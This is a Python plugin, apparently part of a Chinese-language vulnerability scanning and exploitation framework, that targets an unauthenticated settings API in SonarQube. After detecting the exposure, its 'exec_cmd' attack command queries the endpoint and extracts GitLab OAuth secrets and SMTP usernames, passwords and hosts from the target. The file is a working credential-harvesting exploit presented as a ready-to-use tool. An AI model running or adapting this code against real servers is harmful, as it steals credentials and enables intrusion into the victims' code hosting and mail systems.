# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "name": "SonarQube未授权访问",
        "description": "开源代码质量管理系统SonarQube存在未授权访问漏洞。该系统在默认配置下, 未对其API接口进行任何访问控制，攻击者可以通过向系统发送特定的恶意数据包，不经认证即可通过互联网下载该系统审计过的程序源代码。",
    }

    def url(self) -> dict:
        """ 验证方法 """
        r = self.request(
            method='get',
            path='./api/settings/values',
            timeout=15
        )
        if r.status_code == 200 and 'settings' in r.text:
            return {
                "LoopholeInfo": {"app": "SonarQube", "name": "SonarQube未授权访问"}
            }

    @cli.command(description='获取敏感信息')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    def exec_cmd(self, url):
        r = self.request(
            method='get',
            path=urllib.parse.urljoin(url, './api/settings/values'),
            timeout=15
        )
        if r.status_code == 200 and 'settings' in r.text:
            data = []
            for i in r.json()['settings']:
                if 'sonar.auth.gitlab.applicationId' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.url' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'sonar.auth.gitlab.secret' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_secure_connection.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_host.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_username.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_password.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
                elif 'email.smtp_port.secured' == i['key']:
                    data.append({'key': i['key'], 'value': i['value']})
            return data
